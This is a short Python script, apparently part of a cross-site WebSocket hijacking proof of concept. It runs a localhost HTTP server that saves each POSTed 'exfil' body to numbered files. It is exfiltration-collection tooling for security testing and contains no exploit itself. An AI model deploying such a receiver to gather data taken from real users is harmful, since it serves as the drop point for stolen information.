#!/usr/bin/env python3
"""Proof-artifact receiver for the CSWSH PoC.

Listens on 127.0.0.1:<port> and stores POST /exfil bodies under ./received/.
Usage: python3 receiver.py [port]   (default 8899)
"""
import http.server, os, sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8899
os.makedirs("received", exist_ok=True)


class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("content-length", 0))
        body = self.rfile.read(n)
        name = "received/exfil_%d.txt" % len(os.listdir("received"))
        open(name, "wb").write(body)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
        print("[receiver] stored", name, body[:200], flush=True)

    def log_message(self, *a):
        pass


http.server.HTTPServer(("127.0.0.1", PORT), H).serve_forever()
